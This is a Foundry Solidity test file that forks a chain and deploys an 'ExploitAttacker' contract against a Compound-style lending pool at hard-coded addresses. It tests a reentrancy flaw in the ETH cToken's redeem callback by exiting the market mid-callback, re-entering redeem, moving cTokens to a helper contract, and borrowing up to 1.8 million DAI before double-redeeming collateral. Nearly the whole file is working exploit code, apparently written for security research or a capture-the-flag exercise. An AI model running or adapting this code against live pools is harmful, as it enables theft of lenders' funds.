// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ICEther {
    function mint() external payable;
    function redeem(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IComptroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
    function exitMarket(address) external returns (uint256);
    function getAccountLiquidity(address) external view returns (uint256, uint256, uint256);
}

interface ICErc20 {
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function underlying() external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

/// @dev Helper contract to receive transferred cTokens and redeem them
contract CTokenDumper {
    address constant F6_ETH = 0xF6551C22276b9Bf62FaD09f6bD6Cad0264b89789;
    address payable public immutable owner;

    constructor() { owner = payable(msg.sender); }

    function redeemAll() external {
        uint256 bal = ICEther(F6_ETH).balanceOf(address(this));
        if (bal > 0) {
            ICEther(F6_ETH).redeem(bal);
        }
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {}
}

contract ExploitAttacker {
    address constant COMPTROLLER = 0x814b02C1ebc9164972D888495927fe1697F0Fb4c;
    address constant F6_ETH = 0xF6551C22276b9Bf62FaD09f6bD6Cad0264b89789;
    address constant F_DAI_6 = 0x989273ec41274C4227bCB878C2c26fdd3afbE70d;

    address payable public immutable owner;
    CTokenDumper public dumper;
    bool public inRedeem;
    uint256 public callbackAction; // 0=nothing, 1=try redeem, 2=try transfer, 3=try exitMarket no borrow

    constructor() {
        owner = payable(msg.sender);
        dumper = new CTokenDumper();
    }

    /// @dev Test 1: No borrow, just mint + redeem(1) + exitMarket in callback + redeem all
    function testNoBorrow() external payable {
        console.log("=== Test: No borrow, exitMarket during callback ===");
        ICEther(F6_ETH).mint{value: msg.value}();
        uint256 cBal = ICEther(F6_ETH).balanceOf(address(this));
        console.log("cTokens:", cBal);

        // Enter market
        address[] memory m = new address[](1);
        m[0] = F6_ETH;
        IComptroller(COMPTROLLER).enterMarkets(m);

        // Redeem(1) to trigger callback
        callbackAction = 3;
        inRedeem = true;
        uint256 r = ICEther(F6_ETH).redeem(1);
        inRedeem = false;
        console.log("Outer redeem result:", r);

        // Now try to redeem all (if we exited the market, no collateral check)
        uint256 remaining = ICEther(F6_ETH).balanceOf(address(this));
        console.log("Remaining cTokens:", remaining);
        if (remaining > 0) {
            uint256 r2 = ICEther(F6_ETH).redeem(remaining);
            console.log("Redeem all result:", r2);
        }

        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    /// @dev Test 2: Try re-entering redeem during callback (expect revert?)
    function testReenterRedeem() external payable {
        console.log("=== Test: Re-enter redeem during callback ===");
        ICEther(F6_ETH).mint{value: msg.value}();
        callbackAction = 1;
        inRedeem = true;
        uint256 r = ICEther(F6_ETH).redeem(1);
        inRedeem = false;
        console.log("Outer redeem result:", r);
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    /// @dev Test 3: Try transferring cTokens during callback
    function testTransferInCallback() external payable {
        console.log("=== Test: Transfer cTokens during callback ===");
        ICEther(F6_ETH).mint{value: msg.value}();
        callbackAction = 2;
        inRedeem = true;
        uint256 r = ICEther(F6_ETH).redeem(1);
        inRedeem = false;
        console.log("Outer redeem result:", r);

        // Check if cTokens were transferred
        uint256 myBal = ICEther(F6_ETH).balanceOf(address(this));
        uint256 dumperBal = ICEther(F6_ETH).balanceOf(address(dumper));
        console.log("My cTokens after:", myBal);
        console.log("Dumper cTokens:", dumperBal);

        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    /// @dev Test 4: Borrow DAI, then no-borrow exitMarket approach
    /// The idea: borrow DAI FIRST, then redeem(1) triggers callback,
    /// but since cTokens aren't decremented, exitMarket sees full collateral
    /// Wait - exitMarket still fails because it checks hypothetical redeem of ALL tokens
    /// and we have outstanding borrows.
    /// NEW IDEA: Don't exitMarket. Instead, during callback, call redeem AGAIN
    /// on the SAME cToken. If nonReentrant is NOT set, we can double-redeem!
    function testBorrowThenDoubleRedeem() external payable {
        console.log("=== Test: Borrow + double redeem ===");
        ICEther(F6_ETH).mint{value: msg.value}();
        uint256 cBal = ICEther(F6_ETH).balanceOf(address(this));
        console.log("cTokens:", cBal);

        // Enter market
        address[] memory m = new address[](1);
        m[0] = F6_ETH;
        IComptroller(COMPTROLLER).enterMarkets(m);

        // Borrow DAI
        uint256 cash = ICErc20(F_DAI_6).getCash();
        uint256 amt = cash > 1_800_000 ether ? 1_800_000 ether : cash;
        ICErc20(F_DAI_6).borrow(amt);
        console.log("DAI borrowed:", IERC20(ICErc20(F_DAI_6).underlying()).balanceOf(address(this)) / 1e18);

        // Redeem ALL cTokens during callback (double redeem)
        callbackAction = 1;
        inRedeem = true;
        uint256 r = ICEther(F6_ETH).redeem(cBal);
        inRedeem = false;
        console.log("Outer redeem result:", r);

        console.log("cTokens after:", ICEther(F6_ETH).balanceOf(address(this)));
        console.log("ETH balance:", address(this).balance / 1e18);

        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!inRedeem || msg.sender != F6_ETH) return;
        inRedeem = false; // prevent recursive entry into OUR logic

        console.log("  [callback] ETH:", msg.value);
        uint256 cBal = ICEther(F6_ETH).balanceOf(address(this));
        console.log("  [callback] cBal:", cBal);

        if (callbackAction == 1) {
            // Try to redeem more cTokens
            console.log("  [callback] Trying redeem...");
            try ICEther(F6_ETH).redeem(cBal) returns (uint256 ret) {
                console.log("  [callback] Redeem SUCCESS:", ret);
            } catch Error(string memory reason) {
                console.log("  [callback] Redeem FAILED:", reason);
            } catch {
                console.log("  [callback] Redeem FAILED (low-level)");
            }
        } else if (callbackAction == 2) {
            // Try to transfer cTokens
            console.log("  [callback] Trying transfer...");
            try ICEther(F6_ETH).transfer(address(dumper), cBal) returns (bool ok) {
                console.log("  [callback] Transfer result:", ok);
            } catch Error(string memory reason) {
                console.log("  [callback] Transfer FAILED:", reason);
            } catch {
                console.log("  [callback] Transfer FAILED (low-level)");
            }
        } else if (callbackAction == 3) {
            // exitMarket (no borrow)
            uint256 code = IComptroller(COMPTROLLER).exitMarket(F6_ETH);
            console.log("  [callback] exitMarket:", code);
        }
    }
}

contract Pool6Debug2 is Test {
    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH3_FEIRARI"));
    }

    function test_no_borrow_exit() public {
        vm.deal(address(this), 100 ether);
        ExploitAttacker a = new ExploitAttacker();
        a.testNoBorrow{value: 10 ether}();
    }

    function test_reenter_redeem() public {
        vm.deal(address(this), 100 ether);
        ExploitAttacker a = new ExploitAttacker();
        a.testReenterRedeem{value: 10 ether}();
    }

    function test_transfer_in_callback() public {
        vm.deal(address(this), 100 ether);
        ExploitAttacker a = new ExploitAttacker();
        a.testTransferInCallback{value: 10 ether}();
    }

    function test_borrow_double_redeem() public {
        vm.deal(address(this), 2000 ether);
        ExploitAttacker a = new ExploitAttacker();
        a.testBorrowThenDoubleRedeem{value: 1000 ether}();
    }

    receive() external payable {}
}
